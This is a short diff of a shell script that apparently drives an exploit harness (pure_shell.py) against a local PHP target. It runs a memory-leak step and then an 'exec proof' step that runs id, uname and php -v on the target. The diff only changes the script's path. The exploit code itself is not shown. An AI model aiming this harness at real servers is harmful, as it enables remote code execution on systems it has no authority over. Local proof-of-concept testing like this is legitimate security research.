@@ -30,13 +30,13 @@ echo "[2/4] target"
 "$HERE/run.sh"
 
 echo "[3/4] leak-only"
-python3 "$HERE/../oneshot-8426/pure_shell.py" \
+python3 "$HERE/../oneshot/pure_shell.py" \
   --host 127.0.0.1 --port "$PORT" --path /index.php \
   --outdir "$HERE/out" --zif "$ZIF" --dtor "$DTOR" \
   --leak --no-banner --log "$LOG" 2>&1 | tee -a "$LOG" || true
 
 echo "[4/4] exec proof"
-python3 "$HERE/../oneshot-8426/pure_shell.py" \
+python3 "$HERE/../oneshot/pure_shell.py" \
   --host 127.0.0.1 --port "$PORT" --path /index.php \
   --outdir "$HERE/out" --zif "$ZIF" --dtor "$DTOR" \
   --exec 'id; uname -sr; php -v | head -1' \
